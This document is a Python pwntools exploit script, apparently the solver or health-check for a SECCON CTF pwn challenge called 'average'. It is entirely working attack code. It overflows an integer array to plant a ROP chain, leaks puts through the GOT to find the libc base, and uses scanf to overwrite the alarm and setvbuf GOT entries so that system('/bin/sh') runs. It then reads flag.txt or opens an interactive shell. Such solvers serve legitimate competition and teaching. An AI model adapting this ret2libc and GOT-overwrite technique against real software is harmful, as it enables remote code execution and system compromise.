import os
from pwn import *

health_check = bool(os.getenv('SECCON_HOST'))

elf = ELF("average")
context.binary = elf

if health_check:
  s = remote(os.getenv("SECCON_HOST"), int(os.getenv("SECCON_PORT")))
else:
  s = remote("localhost", 1234)

pop_rsi_r15 = 0x4013a1
pop_rdi = 0x4013a3
nop = 0x4013a4

payload = ([0]*16 + [
  0,  # n
  0,  # average
  0,  # sum
  19, # i
  0,  # rbp

  # puts(puts)
  pop_rdi,
  elf.got.puts,
  elf.plt.puts,

  # scanf("%lld", alarm)
  pop_rdi,
  next(elf.search(b"%lld")),
  pop_rsi_r15,
  elf.got.alarm,
  0,
  nop,
  elf.plt.__isoc99_scanf,

  # scanf("%lld", setvbuf)
  pop_rdi,
  next(elf.search(b"%lld")),
  pop_rsi_r15,
  elf.got.setvbuf,
  0,
  elf.plt.__isoc99_scanf,

  # alarm(setvbuf) = system("/bin/sh")
  pop_rdi,
  elf.got.setvbuf,
  nop,
  elf.plt.alarm,
])
payload[16] = len(payload)

s.sendlineafter("n: ", str(len(payload)))
for p in payload:
  s.sendlineafter(": ", str(p))

s.readline() # Average = ???
puts = int.from_bytes(s.readline()[:-1], "little")

libc = ELF("libc.so.6")
libc.address = puts - libc.symbols.puts

s.sendline(str(libc.symbols.system))
s.sendline(str(unpack(b"/bin/sh\0")))

if health_check:
  s.sendline("cat flag.txt")
  print(s.readline()[:-1].decode())
else:
  s.interactive()
